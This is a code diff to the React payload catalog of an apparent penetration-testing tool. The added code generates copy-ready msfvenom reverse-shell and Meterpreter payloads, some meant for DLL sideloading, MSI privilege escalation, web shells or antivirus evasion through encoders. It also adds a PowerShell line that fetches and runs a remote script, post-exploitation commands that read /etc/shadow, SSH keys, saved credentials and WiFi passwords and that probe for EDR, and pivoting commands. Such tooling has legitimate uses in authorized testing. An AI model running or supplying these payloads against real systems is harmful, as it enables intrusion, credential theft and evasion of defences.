@@ -1,10 +1,6 @@
 import { useEffect, useState } from "react";
 import { getStager } from "./api";
 
-// A curated reverse-shell payload catalog — "recce writes the payload for you". Templates
-// are filled with the listener's LHOST + port so a tester never hand-assembles a one-liner
-// or guesses which works on a given target. Grouped by platform because that's the real
-// decision (bash /dev/tcp is Linux-only; Windows needs PowerShell, etc.).
 type P = { label: string; tmpl: string; note?: string };
 const CATALOG: { group: string; items: P[] }[] = [
   {
@@ -76,16 +72,26 @@ const CATALOG: { group: string; items: P[] }[] = [
       { label: "scp", tmpl: "scp user@{LHOST}:/path/to/file /tmp/file", note: "needs SSH access to attacker" },
     ],
   },
+  {
+    group: "msfvenom (compiled)",
+    items: [
+      { label: "Linux ELF x64", tmpl: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o shell.elf && chmod +x shell.elf", note: "then transfer & execute" },
+      { label: "Linux ELF x86", tmpl: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o shell.elf" },
+      { label: "Windows EXE x64", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o shell.exe" },
+      { label: "Windows EXE x86", tmpl: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o shell.exe" },
+      { label: "Windows DLL x64", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f dll -o shell.dll", note: "for DLL hijack / sideload" },
+      { label: "Windows MSI", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f msi -o shell.msi", note: "AlwaysInstallElevated privesc" },
+      { label: "Java WAR", tmpl: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f war -o shell.war", note: "deploy to Tomcat / JBoss" },
+      { label: "Python", tmpl: "msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={PORT} -f raw -o shell.py" },
+      { label: "ASP", tmpl: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f asp -o shell.asp", note: "classic ASP (IIS)" },
+      { label: "ASPX", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f aspx -o shell.aspx", note: ".NET web shell" },
+      { label: "HTA", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f hta-psh -o shell.hta", note: "for mshta delivery" },
+      { label: "Meterpreter x64", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "staged — needs handler" },
+      { label: "Meterpreter Linux", tmpl: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o meterpreter.elf" },
+    ],
+  },
 ];
 
-// The robust shell: a reconnecting-PTY stager. Unlike the raw one-liners below, this gives
-// a real PTY (full interactivity from byte one — no stabilize dance), announces a session
-// token so it rebinds to the SAME recce session, and auto-reconnects on drop. A script, not
-// a compiled implant — plain transport, no toolchain.
-// The robust reconnecting-PTY stager is served by the backend (single source of truth,
-// see /api/stager) and fetched below — no hardcoded copy to drift out of sync.
-
-// raw one-liners for a TLS listener (plaintext ones won't complete the TLS handshake)
 const TLS_CATALOG: { group: string; items: P[] }[] = [
   {
     group: "Linux / Unix (TLS)",
@@ -106,7 +112,173 @@ const TLS_CATALOG: { group: string; items: P[] }[] = [
       { label: "ncat.exe --ssl", tmpl: "ncat.exe --ssl {LHOST} {PORT} -e cmd.exe", note: "if ncat present on target" },
     ],
   },
+  {
+    group: "msfvenom TLS (compiled)",
+    items: [
+      { label: "Linux ELF x64 (staged)", tmpl: "msfvenom -p linux/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f elf -o shell.elf", note: "use multi/handler with same payload" },
+      { label: "Windows EXE x64 (staged)", tmpl: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f exe -o shell.exe" },
+      { label: "Meterpreter HTTPS", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "HTTPS transport — blends with web traffic" },
+    ],
+  },
 ];
+
+// Interactive msfvenom command builder
+type VenomOpt = { payload: string; format: string; ext: string };
+const VENOM_PAYLOADS: Record<string, Record<string, VenomOpt[]>> = {
+  linux: {
+    x64: [
+      { payload: "linux/x64/shell_reverse_tcp", format: "elf", ext: "elf" },
+      { payload: "linux/x64/shell/reverse_tcp", format: "elf", ext: "elf" },
+      { payload: "linux/x64/meterpreter/reverse_tcp", format: "elf", ext: "elf" },
+      { payload: "linux/x64/shell_reverse_tcp", format: "c", ext: "c" },
+    ],
+    x86: [
+      { payload: "linux/x86/shell_reverse_tcp", format: "elf", ext: "elf" },
+      { payload: "linux/x86/meterpreter/reverse_tcp", format: "elf", ext: "elf" },
+    ],
+  },
+  windows: {
+    x64: [
+      { payload: "windows/x64/shell_reverse_tcp", format: "exe", ext: "exe" },
+      { payload: "windows/x64/shell/reverse_tcp", format: "exe", ext: "exe" },
+      { payload: "windows/x64/meterpreter/reverse_tcp", format: "exe", ext: "exe" },
+      { payload: "windows/x64/meterpreter/reverse_https", format: "exe", ext: "exe" },
+      { payload: "windows/x64/shell_reverse_tcp", format: "dll", ext: "dll" },
+      { payload: "windows/x64/shell_reverse_tcp", format: "msi", ext: "msi" },
+      { payload: "windows/x64/shell_reverse_tcp", format: "hta-psh", ext: "hta" },
+      { payload: "windows/x64/shell_reverse_tcp", format: "psh", ext: "ps1" },
+      { payload: "windows/x64/shell_reverse_tcp", format: "aspx", ext: "aspx" },
+    ],
+    x86: [
+      { payload: "windows/shell_reverse_tcp", format: "exe", ext: "exe" },
+      { payload: "windows/meterpreter/reverse_tcp", format: "exe", ext: "exe" },
+      { payload: "windows/shell_reverse_tcp", format: "dll", ext: "dll" },
+    ],
+  },
+  java: {
+    any: [
+      { payload: "java/jsp_shell_reverse_tcp", format: "war", ext: "war" },
+      { payload: "java/jsp_shell_reverse_tcp", format: "raw", ext: "jsp" },
+    ],
+  },
+  php: {
+    any: [
+      { payload: "php/reverse_php", format: "raw", ext: "php" },
+      { payload: "php/meterpreter/reverse_tcp", format: "raw", ext: "php" },
+    ],
+  },
+  python: {
+    any: [
+      { payload: "cmd/unix/reverse_python", format: "raw", ext: "py" },
+      { payload: "python/meterpreter/reverse_tcp", format: "raw", ext: "py" },
+    ],
+  },
+  macos: {
+    x64: [
+      { payload: "osx/x64/shell_reverse_tcp", format: "macho", ext: "macho" },
+      { payload: "osx/x64/meterpreter/reverse_tcp", format: "macho", ext: "macho" },
+    ],
+    arm64: [
+      { payload: "osx/aarch64/shell_reverse_tcp", format: "macho", ext: "macho" },
+    ],
+  },
+};
+
+const ENCODERS = [
+  { value: "", label: "None" },
+  { value: "x86/shikata_ga_nai", label: "shikata_ga_nai (x86)" },
+  { value: "x64/xor", label: "xor (x64)" },
+  { value: "x64/zutto_dekiru", label: "zutto_dekiru (x64)" },
+  { value: "cmd/powershell_base64", label: "powershell_base64" },
+  { value: "php/base64", label: "php/base64" },
+];
+
+export function MsfvenomBuilder({ lhost, port }: { lhost: string; port: number }) {
+  const [os, setOs] = useState("linux");
+  const [arch, setArch] = useState("x64");
+  const [payIdx, setPayIdx] = useState(0);
+  const [encoder, setEncoder] = useState("");
+  const [iterations, setIterations] = useState(1);
+  const [customLhost, setCustomLhost] = useState(lhost);
+  const [customPort, setCustomPort] = useState(String(port));
+  const [outName, setOutName] = useState("");
+  const [ok, setOk] = useState(false);
+
+  const archs = Object.keys(VENOM_PAYLOADS[os] || {});
+  const effectiveArch = archs.includes(arch) ? arch : archs[0] || "x64";
+  const opts = VENOM_PAYLOADS[os]?.[effectiveArch] || [];
+  const opt = opts[payIdx] || opts[0];
+
+  const fname = outName || `shell.${opt?.ext || "bin"}`;
+  let cmd = `msfvenom -p ${opt?.payload || "UNKNOWN"} LHOST=${customLhost} LPORT=${customPort} -f ${opt?.format || "raw"} -o ${fname}`;
+  if (encoder) cmd += ` -e ${encoder} -i ${iterations}`;
+
+  return (
+    <div className="venom-gen">
+      <div className="venom-form">
+        <div className="venom-field">
+          <label>Platform</label>
+          <select value={os} onChange={(e) => { setOs(e.target.value); setPayIdx(0); }}>
+            <option value="linux">Linux</option>
+            <option value="windows">Windows</option>
+            <option value="macos">macOS</option>
+            <option value="java">Java (WAR/JSP)</option>
+            <option value="php">PHP</option>
+            <option value="python">Python</option>
+          </select>
+        </div>
+        <div className="venom-field">
+          <label>Arch</label>
+          <select value={effectiveArch} onChange={(e) => { setArch(e.target.value); setPayIdx(0); }}>
+            {archs.map((a) => <option key={a} value={a}>{a}</option>)}
+          </select>
+        </div>
+        <div className="venom-field">
+          <label>Payload</label>
+          <select value={payIdx} onChange={(e) => setPayIdx(Number(e.target.value))}>
+            {opts.map((o, i) => (
+              <option key={i} value={i}>{o.payload.split("/").slice(-1)[0]} ({o.format})</option>
+            ))}
+          </select>
+        </div>
+        <div className="venom-field">
+          <label>LHOST</label>
+          <input value={customLhost} onChange={(e) => setCustomLhost(e.target.value)} />
+        </div>
+        <div className="venom-field">
+          <label>LPORT</label>
+          <input value={customPort} onChange={(e) => setCustomPort(e.target.value)} />
+        </div>
+        <div className="venom-field">
+          <label>Encoder</label>
+          <select value={encoder} onChange={(e) => setEncoder(e.target.value)}>
+            {ENCODERS.map((e) => <option key={e.value} value={e.value}>{e.label}</option>)}
+          </select>
+        </div>
+        {encoder && (
+          <div className="venom-field">
+            <label>Iterations</label>
+            <input type="number" min={1} max={20} value={iterations}
+                   onChange={(e) => setIterations(Math.max(1, Number(e.target.value)))} />
+          </div>
+        )}
+        <div className="venom-field">
+          <label>Output file</label>
+          <input value={outName} onChange={(e) => setOutName(e.target.value)}
+                 placeholder={`shell.${opt?.ext || "bin"}`} />
+        </div>
+      </div>
+      <div className="venom-output">
+        <code className="venom-cmd">{cmd}</code>
+        <button className="payload-copy venom-copy-btn" onClick={() => {
+          navigator.clipboard?.writeText(cmd).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
+        }}>{ok ? "✓" : "copy"}</button>
+      </div>
+    </div>
+  );
+}
+
+// The robust reconnecting-PTY stager is served by the backend (single source of truth).
 
 const genToken = () => {
   const a = new Uint8Array(8);
@@ -127,16 +299,21 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
   const [lhost, setLhost] = useState(location.hostname);
   const [token] = useState(genToken);
   const [stager, setStager] = useState<string>("");
+  const [collapsed, setCollapsed] = useState<Record<string, boolean>>({});
   useEffect(() => { getStager(tls).then(setStager).catch(() => setStager("")); }, [tls]);
   const fill = (t: string) =>
     t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
   const catalog = tls ? TLS_CATALOG : CATALOG;
+
+  const toggle = (group: string) =>
+    setCollapsed((c) => ({ ...c, [group]: !c[group] }));
+
   return (
     <div className="payload-catalog">
       <label className="payload-lhost">
         LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                      title="the address the target should call back to" />
-        {tls && <span className="muted small">🔒 encrypted listener — use these TLS payloads</span>}
+        {tls && <span className="muted small">encrypted listener — use TLS payloads</span>}
       </label>
 
       <div className="payload-group">
@@ -151,8 +328,12 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
 
       {catalog.map((g) => (
         <div key={g.group} className="payload-group">
-          <div className="payload-group-h">{g.group}</div>
-          {g.items.map((p) => (
+          <button className="payload-group-h payload-group-toggle" onClick={() => toggle(g.group)}>
+            <span className="payload-caret">{collapsed[g.group] ? "▸" : "▾"}</span>
+            {g.group}
+            <span className="payload-group-ct">{g.items.length}</span>
+          </button>
+          {!collapsed[g.group] && g.items.map((p) => (
             <div key={p.label} className="payload-item">
               <span className="payload-label">{p.label}</span>
               <code className="payload-code">{fill(p.tmpl)}</code>
@@ -160,6 +341,215 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
               <CopyLine text={fill(p.tmpl)} />
             </div>
           ))}
+        </div>
+      ))}
+
+      <div className="payload-group">
+        <button className="payload-group-h payload-group-toggle" onClick={() => toggle("_venom_builder")}>
+          <span className="payload-caret">{collapsed["_venom_builder"] ? "▸" : "▾"}</span>
+          msfvenom Command Builder
+          <span className="payload-group-ct">interactive</span>
+        </button>
+        {!collapsed["_venom_builder"] && <MsfvenomBuilder lhost={lhost} port={port} />}
+      </div>
+    </div>
+  );
+}
+
+// Shell stabilization quick-reference (used by SessionTools)
+const STABILIZE_LINUX: P[] = [
+  { label: "1. Spawn PTY", tmpl: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note: "or python2 / script -qc /bin/bash /dev/null" },
+  { label: "2. Background", tmpl: "Ctrl+Z  (in your terminal)", note: "sends raw shell to background" },
+  { label: "3. Fix terminal", tmpl: "stty raw -echo; fg", note: "paste this in YOUR terminal, not the shell" },
+  { label: "4. Set TERM", tmpl: "export TERM=xterm-256color", note: "enables clear, arrow keys, tab completion" },
+  { label: "5. Set size", tmpl: "stty rows {ROWS} cols {COLS}", note: "match your terminal: run `stty size` locally" },
+];
+const STABILIZE_WIN: P[] = [
+  { label: "rlwrap", tmpl: "rlwrap nc -lvnp {PORT}", note: "wrap your listener — gives history + editing" },
+  { label: "ConPty upgrade", tmpl: "IEX(IWR http://{LHOST}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LHOST} {PORT}", note: "full interactive PTY on Windows" },
+];
+
+export function StabilizeGuide({ lhost, port }: { lhost: string; port: number }) {
+  const fill = (t: string) =>
+    t.replace(/\{LHOST\}/g, lhost).replace(/\{PORT\}/g, String(port)).replace(/\{ROWS\}/g, "50").replace(/\{COLS\}/g, "120");
+  return (
+    <div className="stabilize-guide">
+      <div className="stab-section">
+        <div className="stab-section-h">Linux / Unix</div>
+        {STABILIZE_LINUX.map((s) => (
+          <div key={s.label} className="stab-step">
+            <span className="stab-step-label">{s.label}</span>
+            <code className="stab-step-cmd">{fill(s.tmpl)}</code>
+            {s.note && <span className="stab-step-note muted small">{s.note}</span>}
+            {!s.tmpl.includes("Ctrl") && <CopyLine text={fill(s.tmpl)} />}
+          </div>
+        ))}
+      </div>
+      <div className="stab-section">
+        <div className="stab-section-h">Windows</div>
+        {STABILIZE_WIN.map((s) => (
+          <div key={s.label} className="stab-step">
+            <span className="stab-step-label">{s.label}</span>
+            <code className="stab-step-cmd">{fill(s.tmpl)}</code>
+            {s.note && <span className="stab-step-note muted small">{s.note}</span>}
+            <CopyLine text={fill(s.tmpl)} />
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// Post-exploitation recon commands
+type CmdGroup = { heading: string; cmds: P[] };
+const POSTENUM_LINUX: CmdGroup[] = [
+  {
+    heading: "Identity & Access",
+    cmds: [
+      { label: "whoami", tmpl: "whoami" },
+      { label: "id", tmpl: "id" },
+      { label: "sudo privs", tmpl: "sudo -l" },
+      { label: "SUID binaries", tmpl: "find / -perm -4000 -type f 2>/dev/null", note: "GTFOBins candidates" },
+      { label: "capabilities", tmpl: "getcap -r / 2>/dev/null" },
+    ],
+  },
+  {
+    heading: "System Info",
+    cmds: [
+      { label: "hostname", tmpl: "hostname" },
+      { label: "kernel", tmpl: "uname -a" },
+      { label: "distro", tmpl: "cat /etc/os-release 2>/dev/null || cat /etc/*-release" },
+      { label: "network", tmpl: "ip a || ifconfig" },
+      { label: "routes", tmpl: "ip route || route -n" },
+      { label: "ARP table", tmpl: "ip neigh || arp -a" },
+      { label: "DNS", tmpl: "cat /etc/resolv.conf" },
+    ],
+  },
+  {
+    heading: "Interesting Files",
+    cmds: [
+      { label: "passwd", tmpl: "cat /etc/passwd" },
+      { label: "shadow (if root)", tmpl: "cat /etc/shadow" },
+      { label: "crontabs", tmpl: "crontab -l 2>/dev/null; ls -la /etc/cron*" },
+      { label: "writable dirs", tmpl: "find / -writable -type d 2>/dev/null | head -20" },
+      { label: "SSH keys", tmpl: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null" },
+      { label: "config files", tmpl: "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | grep -v proc | head -30" },
+      { label: "history files", tmpl: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50" },
+    ],
+  },
+  {
+    heading: "Processes & Services",
+    cmds: [
+      { label: "processes", tmpl: "ps auxf" },
+      { label: "listening ports", tmpl: "ss -tlnp || netstat -tlnp" },
+      { label: "connections", tmpl: "ss -tnp || netstat -tnp" },
+      { label: "services", tmpl: "systemctl list-units --type=service --state=running 2>/dev/null" },
+      { label: "docker", tmpl: "docker ps 2>/dev/null || ls -la /var/run/docker.sock" },
+    ],
+  },
+];
+
+const POSTENUM_WIN: CmdGroup[] = [
+  {
+    heading: "Identity & Access",
+    cmds: [
+      { label: "whoami /all", tmpl: "whoami /all" },
+      { label: "local admins", tmpl: "net localgroup administrators" },
+      { label: "domain info", tmpl: "net user /domain 2>nul & net group \"Domain Admins\" /domain 2>nul" },
+      { label: "saved creds", tmpl: "cmdkey /list" },
+      { label: "AlwaysInstallElevated", tmpl: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", note: "if both = 1, privesc via MSI" },
+    ],
+  },
+  {
+    heading: "System Info",
+    cmds: [
+      { label: "systeminfo", tmpl: "systeminfo" },
+      { label: "hostname", tmpl: "hostname" },
+      { label: "network", tmpl: "ipconfig /all" },
+      { label: "routes", tmpl: "route print" },
+      { label: "ARP", tmpl: "arp -a" },
+      { label: "DNS cache", tmpl: "ipconfig /displaydns | findstr \"Record\"" },
+    ],
+  },
+  {
+    heading: "Interesting Files",
+    cmds: [
+      { label: "unattend.xml", tmpl: "dir C:\\Windows\\Panther\\unattend.xml C:\\Windows\\Panther\\Unattend\\unattend.xml 2>nul", note: "may contain cleartext creds" },
+      { label: "SAM/SYSTEM backup", tmpl: "dir C:\\Windows\\Repair\\SAM C:\\Windows\\Repair\\SYSTEM 2>nul" },
+      { label: "PowerShell history", tmpl: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul" },
+      { label: "WiFi passwords", tmpl: "netsh wlan show profiles & for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile \"%a\" key=clear 2>nul | findstr Key" },
+    ],
+  },
+  {
+    heading: "Processes & Services",
+    cmds: [
+      { label: "processes", tmpl: "tasklist /v" },
+      { label: "listening ports", tmpl: "netstat -ano | findstr LISTENING" },
+      { label: "services", tmpl: "wmic service get name,displayname,startmode,pathname 2>nul | findstr /i auto" },
+      { label: "unquoted paths", tmpl: "wmic service get name,pathname 2>nul | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\\\"\"", note: "unquoted service path privesc" },
+      { label: "scheduled tasks", tmpl: "schtasks /query /fo TABLE /nh 2>nul | findstr /v \"INFO:\"" },
+      { label: "AV / EDR", tmpl: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname 2>nul & tasklist | findstr -i \"defender cylance crowdstrike carbon sentinel falcon\"" },
+    ],
+  },
+];
+
+export function PostExploitRef({ hostIp }: { hostIp: string }) {
+  const [platform, setPlatform] = useState<"linux" | "windows">("linux");
+  const groups = platform === "linux" ? POSTENUM_LINUX : POSTENUM_WIN;
+
+  return (
+    <div className="postex-ref">
+      <div className="postex-tabs">
+        <button className={`postex-tab ${platform === "linux" ? "active" : ""}`}
+                onClick={() => setPlatform("linux")}>Linux</button>
+        <button className={`postex-tab ${platform === "windows" ? "active" : ""}`}
+                onClick={() => setPlatform("windows")}>Windows</button>
+      </div>
+      {groups.map((g) => (
+        <div key={g.heading} className="postex-group">
+          <div className="postex-group-h">{g.heading}</div>
+          {g.cmds.map((c) => (
+            <div key={c.label} className="postex-cmd">
+              <span className="postex-cmd-label">{c.label}</span>
+              <code className="postex-cmd-code">{c.tmpl}</code>
+              {c.note && <span className="postex-cmd-note muted small">{c.note}</span>}
+              <CopyLine text={c.tmpl} />
+            </div>
+          ))}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// Pivot & tunnel reference
+const PIVOTS: P[] = [
+  { label: "SSH local forward", tmpl: "ssh -L {PORT}:{TARGET}:{TARGET_PORT} user@{LHOST}", note: "access TARGET:PORT through your box" },
+  { label: "SSH remote forward", tmpl: "ssh -R {PORT}:127.0.0.1:{TARGET_PORT} user@{LHOST}", note: "expose target port back to your box" },
+  { label: "SSH dynamic SOCKS", tmpl: "ssh -D 1080 user@{LHOST}", note: "SOCKS4/5 proxy — use with proxychains" },
+  { label: "chisel server", tmpl: "chisel server --reverse --port {PORT}", note: "run on YOUR box" },
+  { label: "chisel client", tmpl: "chisel client {LHOST}:{PORT} R:socks", note: "run on TARGET — creates SOCKS proxy on your box :1080" },
+  { label: "chisel port fwd", tmpl: "chisel client {LHOST}:{PORT} R:8888:{TARGET}:{TARGET_PORT}", note: "specific port forward" },
+  { label: "socat relay", tmpl: "socat TCP-LISTEN:{PORT},fork TCP:{TARGET}:{TARGET_PORT}", note: "simple TCP relay on target" },
+  { label: "ligolo agent", tmpl: "./agent -connect {LHOST}:{PORT} -ignore-cert", note: "run on target — needs ligolo-ng proxy on your box" },
+  { label: "proxychains", tmpl: "proxychains4 nmap -sT -Pn -p 445 {TARGET}", note: "route through SOCKS after SSH -D or chisel" },
+  { label: "nmap through pivot", tmpl: "proxychains4 nmap -sT -Pn -p 21,22,80,135,139,445,3389,5985 {TARGET}", note: "common ports through proxy" },
+];
+
+export function PivotGuide({ lhost, port, targetIp }: { lhost: string; port: number; targetIp: string }) {
+  const fill = (t: string) =>
+    t.replace(/\{LHOST\}/g, lhost)
+      .replace(/\{PORT\}/g, String(port))
+      .replace(/\{TARGET\}/g, targetIp)
+      .replace(/\{TARGET_PORT\}/g, "445");
+  return (
+    <div className="pivot-guide">
+      {PIVOTS.map((p) => (
+        <div key={p.label} className="pivot-cmd">
+          <span className="pivot-cmd-label">{p.label}</span>
+          <code className="pivot-cmd-code">{fill(p.tmpl)}</code>
+          {p.note && <span className="pivot-cmd-note muted small">{p.note}</span>}
+          <CopyLine text={fill(p.tmpl)} />
         </div>
       ))}
     </div>
